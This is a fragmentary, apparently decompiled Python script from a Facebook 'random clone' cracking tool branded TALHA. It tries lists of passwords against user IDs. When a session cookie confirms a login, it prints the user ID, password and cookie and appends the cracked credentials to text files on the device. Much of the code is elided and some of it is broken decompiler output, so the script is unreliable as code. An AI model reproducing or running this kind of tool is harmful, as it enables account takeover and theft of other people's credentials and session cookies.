...
def o():
    ...
    if None == '2':
        ...
        os.system('xdg-open https://www.facebook.com/groups/cyber.solution.bd.csb001/')

        return None

    if None == '3':

        os.system('xdg-open https://github.com/talha123444e441')
...
def i():
    ...
    print('IDS SAVED IN TALHA-420OK.txt, TALHA-420CP.txt')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\033[1;32mTALHA-OK ]' +uid+ ' | ' +ps+'\033[0;35m')

                print(f"{B}\033[0;35m[COOKIE] :\033[1;32m{coki}")

                cek_apk(session,coki)

                open('/sdcard/TALHA-505-OK.txt', 'a').write(uid+' | '+ps+'\n')
        ...
        sys.stdout.write('\r%s[TALHA] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
...
\033[1;32m │\33[37;41m\t     BD RENDOM CLONE VERSION 00-9     \33[0;m  │
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\033[1;32mTALHA-505-OK ]' +uid+ ' | ' +ps+'\033[0;35m')
        ...
        sys.stdout.write('\r%s[TALHA,-420] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
